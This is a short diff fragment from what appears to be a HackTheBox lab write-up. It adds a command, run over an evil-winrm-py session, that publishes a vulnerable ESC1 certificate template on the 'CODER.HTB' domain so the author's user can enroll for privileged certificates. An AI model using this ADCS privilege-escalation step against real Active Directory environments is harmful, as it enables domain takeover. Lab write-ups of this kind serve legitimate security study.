@@ -1037,6 +1037,10 @@ evil-winrm-py PS C:\Users\e.black\Desktop>
 Ill upload it
 
 ```python
-
+evil-winrm-py PS C:\Users\e.black\Desktop> New-ADCSTemplate -DisplayName "ESC1" -Publish -JSON (Get-Content .\ESC1.json -raw) -Identity "CODER.HTB\PKI Admins"
 ```
+
+And now ill use the cmd let from `ADCSTemplate.psm1` to create the new template from the esc1 json file then also set the identity so my user can enroll
+
+
 
